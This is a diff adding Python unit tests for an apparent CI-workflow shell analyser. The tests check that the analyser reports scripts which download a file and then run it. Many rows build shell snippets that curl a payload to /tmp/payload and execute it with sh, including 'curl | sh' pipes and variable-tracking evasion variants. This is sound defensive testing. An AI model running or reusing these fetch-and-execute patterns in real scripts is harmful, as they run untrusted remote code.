+        ('SW26', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW27', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand unset -v T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW28', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand unset -v T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW29', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW30', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW31', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand read -r T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW32', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand read -r T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW33', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand -- read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW34', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand -- read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW35', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand -p read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW36', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand -p read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW37', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\n$NOPE command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW38', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\n$NOPE command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW39', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nx=1 command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW40', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\nx=1 command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW41', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW42', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW43', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand unset T U\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW44', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nfor i in 1 2; do\ng\ncommand unset T U\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SX10', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nh() {\ng\ncommand unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\n}\nh'),
+        ('SX11', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nk() { U=/dev/null; }\ng\nk\ncommand unset T\nk\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SX14', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nh() {\ng\ncommand read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\n}\nh'),
+        ('SX15', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nk() { U=/dev/null; }\ng\nk\ncommand read T < rf\nk\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SX18', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nh() {\ng\ncommand read -r T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\n}\nh'),
+        ('SX19', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nk() { U=/dev/null; }\ng\nk\ncommand read -r T < rf\nk\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SX22', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nh() {\ng\n$NOPE command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\n}\nh'),
+        ('SX23', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\nk() { U=/dev/null; }\ng\nk\n$NOPE command read T < rf\nk\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SX29', '11111100', '@G@\necho x /dev/null > rf\nA=(x /dev/null)\ng() { A=(x @P@); }\ng\ncommand unset A\ng\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\nsh "${A[1]}"'),
+        ('SX31', '11111100', '@G@\necho x /dev/null > rf\nA=(x /dev/null)\ng() { A=(x @P@); }\ng\ncommand read -r -a A < rf\ng\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\nsh "${A[1]}"'),
+        ('SX40', '11111111', '@G@\nT=/dev/null\ng() { T=@P@; }\nh() {\nlocal T=/dev/null\ng\ncommand local T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\n}\nh'),
+        ('WR01', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nnohup unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR02', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nnohup read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR04', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nnice unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR05', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nnice read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR07', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nnice -n 1 unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR08', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nnice -n 1 read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR10', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nenv unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR11', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nenv read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR13', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nenv -i unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR14', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nenv -i read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR16', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ntimeout 5 unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR17', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ntimeout 5 read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR19', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nstdbuf -o0 unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR20', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nstdbuf -o0 read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR22', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nsetsid unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR23', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nsetsid read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR25', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nflock rf unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR26', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nflock rf read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR28', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nxargs unset T < /dev/null\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR29', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\nxargs read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR31', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand nohup unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WR32', '00100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand nohup read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+    )
+    SHARED = (
+        ('SW81', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\ncommand read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW82', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\ng\ncommand read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW83', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\ncommand read -r T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW84', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\ng\ncommand read -r T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW85', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\ncommand -- read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW86', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\ng\ncommand -- read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW87', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\ncommand -p read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW88', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\ng\ncommand -p read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW89', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\n$NOPE command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW90', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\ng\n$NOPE command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW91', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\nx=1 command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW92', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\ng\nx=1 command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SW93', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\ncommand command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('SW94', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\ng\ncommand command read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\ndone'),
+        ('SX32', '11111100', '@G@\necho x /dev/null > rf\necho \'A=(x @P@)\' > aenv\nA=(x /dev/null)\ng() { . ./aenv; }\ng\ncommand read -r -a A < rf\ng\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\n: "${A[1]}"\nsh "${A[1]}"'),
+        ('SX38', '11111111', '@G@\necho /dev/null > rf\necho T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\ng\ncommand read T < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+    )
+
+    @staticmethod
+    def seat(row):
+        return row.replace("@G@", "curl -fsSLo @P@ %spayload" % URL).replace("@P@", "/tmp/payload") + "\n"
+
+    def test_each_reports_under_every_setting(self):
+        for name, truth, row in self.GATE + self.SHARED:
+            for shell, parents in TestTheRoundTenSeatsRows.PARENTS:
+                with self.subTest(row=name, shell=shell, runs=any(truth[p] == "1" for p in parents)):
+                    self.assertTrue(reported(self.seat(row), shell))
+
+
+class TestTheRoundTwelveSeatsRows(unittest.TestCase):
+    """PR #2855 round 13, the round-12 verdict's B1 and F1, on its seat's rows (the round-11
+    rows' `seat`: the download to `@P@`, truth over eight parents). Past the budget a visit
+    stands in again what the statements since the last one may set
+    (`workflow_called._Step.set_at`), and a `read`, `unset` or `local` -- behind a wrapper too
+    -- sets the name its word names, not the word: its seat's mR10 let the word `T=/dev/null`
+    stand for a plain `local`'s `T`, and SX41 read CLEAN where every parent runs the payload;
+    its mR7 let `T[0]` stand for `T` (WX25-WX28). RP01 and RP02 are round 13's own: a bare
+    `read`, whose `REPLY` only `_written` names. Each reports under every setting: where no
+    parent runs the payload -- dash under `-e`, which refuses `read 'T[0]'` and a bare `read`,
+    and bash 3.2 and dash under `-e`, which refuse `unset 'T[0]'` of a name that holds no array
+    -- it is the carry's price, as round 12's rows are."""
+
+    GATE = (
+        ('SX41', '11111111', '@G@\nT=/dev/null\ng() { T=@P@; }\nh() {\nlocal T=/dev/null\ng\nlocal T=/dev/null\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"\n}\nh'),
+        ('WX25', '11111101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand read \'T[0]\' < rf\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('WX27', '11100101', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand unset \'T[0]\'\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('RP01', '11111101', '@G@\necho /dev/null > rf\nREPLY=/dev/null\ng() { REPLY=@P@; }\ng\nread -r < rf\ng\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\nsh "$REPLY"'),
+        ('RP02', '11111101', '@G@\necho /dev/null > rf\nREPLY=/dev/null\ng() { REPLY=@P@; }\ng\ncommand read -r < rf\ng\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\n: "$REPLY"\nsh "$REPLY"'),
+    )
+
+    def test_each_reports_under_every_setting(self):
+        for name, truth, row in self.GATE:
+            for shell, parents in TestTheRoundTenSeatsRows.PARENTS:
+                with self.subTest(row=name, shell=shell, runs=any(truth[p] == "1" for p in parents)):
+                    self.assertTrue(reported(TestTheRoundElevenSeatsRows.seat(row), shell))
+
+
+class TestASubshellBodyByTheTokenAfterItsHeader(unittest.TestCase):
+    """PR #2855 round 9, F2: round 8 read a body as a subshell where its header's stage opened a
+    `(` and no `{` stood among its first three words, so `f() ( { T=P; } )` and `f() ( echo { ;
+    T=P )` were carried, an over-report. A body is a subshell where that `(` is followed by no
+    structural `{` (`_function_syntax`), or outlives the body's `}`: the reader keeps no place for
+    a `(`, so its depth says which came first (`workflow_called._subshell`). Rows are the round-8
+    seat's (SB100, SX01-SX17), truth over 8 parents."""
+
+    NONE_RUN = (  # SB100, SX01, SX02, SX04, SX05, SX06, SX09; and SX10, a `{` fourth
+        'T=/dev/null; f() ( { T=@P@; } ); f; sh "$T"',
+        'T=/dev/null; f() ( echo { ; T=@P@ ); f; sh "$T"',
+        'T=/dev/null; f() ( { T=@P@; }; : ); f; sh "$T"',
+        'T=/dev/null; f() ( : { ; T=@P@ ); f; sh "$T"',
+        'T=/dev/null; f ( ) ( { T=@P@; } ); f; sh "$T"',
+        'T=/dev/null; function f ( { T=@P@; } ); f; sh "$T"',
+        'T=/dev/null; f() ( { T=@P@; } ); g() { f; }; g; sh "$T"',
+        'T=/dev/null; f() ( printf %s { ; T=@P@ ); f; sh "$T"')
+    ALL_RUN = (  # SX11, SX12, SX14, SX17: brace bodies, a `{` word or a subshell first
+        'T=/dev/null; f() { { T=@P@; }; }; f; sh "$T"',
+        'T=/dev/null; f() { echo { ; T=@P@; }; f; sh "$T"',
+        'T=/dev/null; f() { ( : ) ; T=@P@; }; f; sh "$T"',
+        'T=/dev/null; f ( ) { T=@P@; }; f; sh "$T"',
+        'T=/dev/null; f() { (T=x; U=y); T=@P@; }; f; sh "$T"')
+    BASH_RUN = (  # SX13, SX15, SX16: `function` headers dash rejects
+        'T=/dev/null; function f { ( :; ); T=@P@; }; f; sh "$T"',
+        'T=/dev/null; function f () { T=@P@; }; f; sh "$T"',
+        'T=/dev/null; function f ( ) { T=@P@; }; f; sh "$T"')
+
+    def test_a_subshell_body_reaches_nothing(self):
+        for row in self.NONE_RUN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(filled(row), shell))
+
+    def test_a_brace_body_is_carried(self):
+        for rows, shells in ((self.ALL_RUN, SHELLS), (self.BASH_RUN, (None, "bash", "bash {0}"))):
+            for row in rows:
+                for shell in shells:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(filled(row), shell))
+
+
+class TestEveryHeaderSpellingTheSeatAskedFor(unittest.TestCase):
+    """The #2855 seat's round-1 note 3: pins for `f( ){`, a tab before `{`, `function f(){`,
+    and a header after `else`, `elif`, `while`, `until`, `!`, `&&`, `||` or `;` -- each a
+    definition every shell takes, whose call runs the pipe."""
+
+    ROWS = ("f( ){ @C@; }\nf", "f ()\t{ @C@; }\nf", "function f(){ @C@; }\nf",
+            "if false; then :; else f(){ @C@; }; fi\nf", "if false; then :; elif f() { @C@; }; then :; fi\nf",
+            "while f(){ @C@; }; do break; done\nf", "until f(){ @C@; }; do :; done\nf",
+            "! f() { @C@; }\nf", "true && f(){ @C@; }\nf", "false || f() { @C@; }\nf", ":; f(){ @C@; }\nf")
+
+    def test_each_is_reported(self):
+        for row in self.ROWS:
+            with self.subTest(row=row):
+                self.assertTrue(reported(filled(row, check=PIPE)))
+
+
+class TestTheEdgesOfTheDollarBraceWord(unittest.TestCase):
+    """PR #2856 fix rounds. B1: `$$` is bash's PID, read as the pair before anything the second
+    `$` could open -- `$${` had been read as `${`, taking a pipe or a use to the next `}` as
+    one word. B2: a download destination spelled as an unquoted `${…}` holding a blank
+    (`-o ${D:-tool }`, `${D:=tool }`, `--output`, `> ${D:-tool }`) lost `main`'s report once
+    #2731 read the word whole. Since round 5 no destination default is resolved to its
+    literal -- the name may be set where no shell text shows it, the workflow's `env:` or
+    `$GITHUB_ENV` -- and such a word is handed on split at its blanks exactly as `main` read
+    it: an unresolved transfer, reported. A blank-free `${D:-tool}` stays as written, `main`'s
+    reading (#2867 stays open, its own PR)."""
+
+    PID_ROWS = ("curl -fsSL %si.sh$${ | sh; echo }" % URL,
+                GET + "echo $${ x; sh tool; echo }",
+                'echo "a"$${ x; curl -fsSL %si.sh | sh; echo }' % URL)
+    DEST = ("-o ${D:-tool }", "-o ${D:- tool}", "-o ${D:=tool }", "-o ${D:+tool }",
+            "--output ${D:-tool }", "-o ${D:-tool\t}", "> ${D:-tool }")
+    # Round 5: `-o ${D:-other }` and `-o ${D:-x }` with `D` never set report again, as `main`
+    # reads them (each was an honest clear only if no `env:` sets `D`); `wget -O ${D:-tool }`
+    # and the blank-free `-o ${D:-tool}` read as `main`, CLEAN (#2867, not this PR's).
+    DEST_ROWS = tuple("curl -fsSL %stool %s\nsh tool" % (URL, dest) for dest in DEST) + (
+        "curl -fsSLo ${D:-tool } %stool\nsh tool" % URL,
+        "curl -fsSL %stool -o ${D:-tool }\nchmod +x tool; ./tool" % URL,
+        "curl -fsSL %stool -o ${D:-tool } && sh tool" % URL,
